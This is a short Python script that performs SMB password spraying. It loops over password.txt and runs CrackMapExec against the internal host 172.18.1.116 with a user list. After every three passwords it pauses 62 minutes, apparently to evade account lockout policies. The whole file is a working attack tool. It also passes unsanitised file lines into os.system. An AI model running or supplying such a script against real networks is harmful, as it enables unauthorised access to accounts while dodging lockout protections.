import os
import time

i = 1

with open('password.txt') as f:
 for line in f:
  print("===================================================================================================")	
  print("testing with password: "+ line)
  os.system('cme smb 172.18.1.116 -u user.txt --continue-on-success -p ' +line)	
  if (i ==3):
   i = 0
   time.sleep(3720) # Sleep for 62 minutes
  else:
   i = i + 1	
